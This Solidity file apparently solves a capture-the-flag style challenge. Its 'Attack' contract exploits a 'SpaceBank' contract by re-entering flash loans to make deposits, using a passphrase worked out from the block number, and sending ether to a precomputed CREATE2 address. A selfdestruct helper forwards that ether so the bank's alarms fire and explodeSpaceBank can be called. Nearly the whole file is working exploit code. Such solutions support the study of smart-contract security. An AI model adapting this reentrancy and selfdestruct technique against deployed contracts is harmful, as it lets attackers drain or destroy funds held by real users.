pragma solidity ^0.8.9;

import {SpaceBank, SpaceToken} from "./SpaceBank.sol";

contract Attack {
    SpaceBank public bank;
    SpaceToken public token;

    error Test(uint256 x, uint256 y);

    constructor(address _bank, address _token) {
        bank = SpaceBank(_bank);
        token = SpaceToken(_token);
    }

    function attack(uint256 amount) external payable {
        require(amount == 3 || amount == 999);

        if (amount == 3) {
            require(msg.value >= 1000);
            bank.flashLoan(3, address(this));
        } else {
            bank.flashLoan(999, address(this));
        }
    }

    function executeFlashLoan(uint256 amount) external {
        if (amount == 3) {
            // Step 1: Trigger the first alarm by depositing 1 wei with the correct passphrase
            uint256 passphrase = block.number % 47;
            token.approve(address(bank), type(uint256).max);
            bank.deposit(1, abi.encode(passphrase));

            // Step 2: Trigger the second alarm by sending selfdestruct contract data with
            bytes memory data = abi.encodePacked(
                type(SendEther).creationCode,
                abi.encode(address(bank))
            );
            address _precomputedAddress = precompute(data, address(bank));
            payable(_precomputedAddress).transfer(1000 wei);
            bank.deposit(1, data);

            token.transfer(address(bank), 1);
        }

        if (amount == 999) {
            bank.flashLoan(1, address(this));
        }

        if (amount == 1) {
            bank.explodeSpaceBank();

            token.transfer(address(bank), 1000);
        }
    }

    ////// VIEWS //////
    function precompute(
        bytes memory data,
        address tokenBankAddr
    ) public view returns (address) {
        address precomputed = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            tokenBankAddr,
                            bytes32(block.number), // MagicNumber (salt)
                            keccak256(data) // the same data that we send to tokenBank
                        )
                    )
                )
            )
        );
        return precomputed;
    }
}

contract SendEther {
    constructor(address payable testContract) {
        selfdestruct(testContract);
    }
}
